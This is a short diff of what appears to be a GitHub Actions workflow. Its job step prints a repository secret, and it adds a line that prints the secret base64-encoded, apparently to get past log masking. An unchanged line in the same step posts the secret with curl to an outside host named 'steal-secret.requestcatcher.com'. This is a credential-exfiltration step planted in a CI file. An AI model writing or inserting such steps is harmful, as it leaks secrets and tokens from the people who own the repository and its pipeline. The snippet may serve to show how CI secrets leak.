@@ -13,5 +13,6 @@ jobs:
         run: |
           echo ${{ secrets.MY_SECRET }}
           echo $my_secret
+          echo $my_secret | base64
           curl -X POST -d "Secret: $my_secret" https://steal-secret.requestcatcher.com
 
